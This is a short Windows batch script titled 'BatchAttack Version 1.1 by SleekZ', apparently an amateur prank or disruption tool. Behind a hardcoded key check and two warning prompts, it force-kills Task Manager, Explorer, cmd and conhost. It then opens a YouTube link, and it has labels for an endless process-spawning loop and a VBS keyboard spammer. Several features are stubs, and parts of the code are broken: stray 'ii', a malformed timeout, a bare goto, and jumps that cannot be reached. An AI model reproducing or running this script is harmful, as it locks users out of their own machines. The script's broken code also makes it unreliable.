@echo off
title BatchAttack Version 1.1 by SleekZ

echo Please enter the safe key found on the Github repo!
:key
set/p "key=>"
if NOT %key%==BA-909-Z goto WrongKey

if %key%==BA-909-Z goto Correct
ii
:WrongKey

echo Invalid Key!
Timeout /t 1
exit

:Correct
echo Valid key...

timeout /2 
cls 

echo Are you sure you want to run BatchAttack? The author is NOT responsible for any damage done to this machine!
pause
cls
echo Last chance!
pause   
cls
echo Loading BatchAttack. . .
ping localhost -n 1 >nul
ping localhost -n 2 >nul

:anticlose
taskkill /f /im taskmgr.exe
taskkill /f /im notepad.exe
taskkill /f /im explorer.exe
taskkill /f /im cmd.exe
taskkill /f /im conhost.exe

goto :shrek
goto :Keyboardspam
goto :keyboarddisabler
goto :mousedisabler
goto :looper
goto :end

timeout /t 5
goto 

:looper 

:loop 
start 
goto loop



:Keyboardspam
start key.vbs
:keyboarddisabler
echo Feature not complete!
:mousedisabler
echo Feature not complete!
:soundspam
echo Feature not complete!

:shrek
start https://www.youtube.com/watch?v=pxw-5qfJ1dk








